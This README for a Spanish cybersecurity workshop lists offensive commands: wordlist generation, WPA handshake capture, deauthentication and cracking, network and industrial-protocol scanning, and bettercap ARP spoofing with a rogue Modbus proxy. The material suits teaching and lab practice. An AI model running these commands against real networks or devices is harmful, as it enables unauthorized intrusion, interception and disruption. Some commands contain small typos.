# udg-taller-ciberseguridad

## Creando diccionarios
### CEWL
```bash
cewl --min_word_length 4 --write ./passwords.txt --email -v <target>
```
### Wister
```bash
python3 -m venv venv
source venv/bin/active
pip install whister

wister -l #list types

wister -c 1 2 3 4 5 -w <w1> <w2> -o ./passwords_02.txt # merge words
wister -c 3 5 -i passwords.txt -o ./passwords_02.txt # merge file and low combinations
wister -c 1 2 3 4 5 -i passwords.txt -o ./passwords_02.txt # merge file
```


## Atacando redes wifi
```bash

sudo airmon-ng start wlp2s0 # monitor
iwconfig # wifi info

sudo airodump-ng wlp2s0mon ## Scan 2Ghz
sudo airodump-ng wlp2s0mon --essid=<ssid>  ## Scan 2Ghz and filter by regex 
sudo airodump-ng wlp2s0mon --essid-regex=<ssid> --band a ### Scan 5Ghz

## Monitor and capture a handshake
sudo airodump-ng wlp2s0mon -c <channel> --bssid <bssid> -w psk.pcap --output-format pcap 

## Send generic deauth packets, may not work in all scenarios
sudo aireplay-ng -0 0 -a <bssid> wlp2s0mon # broadcast
sudo aireplay-ng -0 0 -a <bssid> -c <client-mac> wlp2s0mon # to 1 client

## Cracking
aircrack-ng -w ./creds.txt --bssid=<bssid> ./psk.pcap-0*

sudo airmon-ng check kill ## stop

```

## Encontrando dispositivos en la red
```bash
netdiscover -i wlp2s0 -r 192.168.1.0/24
netdiscover -i wlp2s0 -p
sudo arp-scan -I wlp2s0 --localnet
```

## Explorando en la red
```bash
nmap -p 502,4840,80,443,8080,8443,1880 -T5 --open 192.168.1.0/24
nmap --script enip-info -sU -p 44818 <ip> # EtherNet/IP
```

## MITM
```bash
sudo bettercap -iface wlan0
sudo bettercap -iface wlan0 -caplet http-ui
```

| Orden | Descripción |
|-------|---------|
| net.show | Mostrar información sobre la red |
| net.probe on | Iniciar escaneo de host en la red |
| net.recon on | Leer periódicamente la tabla ARP del sistema para detectar nuevos hosts en la red. |
| set arp.spoof.targets 10.10.10.100,10.10.10.200 | Establecer un objetivo en la red | 
| set arp.spoof.internal true | Las conexiones locales entre ordenadores de la red también serán falsificadas, de lo contrario solo se falsificarán las conexiones que vayan hacia y desde la red externa. |
| arp.spoof on| Iniciar arp spoofing |
| arp.ban on | ARP spoofing en modo de prohibición, lo que significa que la conectividad del objetivo no funcionará. | 


### Modbus transparent proxy
```bash
set tcp.address 10.10.10.200
set tcp.port 502
set tcp.tunnel.address 127.0.0.1
set tcp.tunnel.port 502
tcp.proxy on
```

> Recuerda, tienes que correr un proxy modbus en local para que funcione `python3 modbus/rogue_server.py`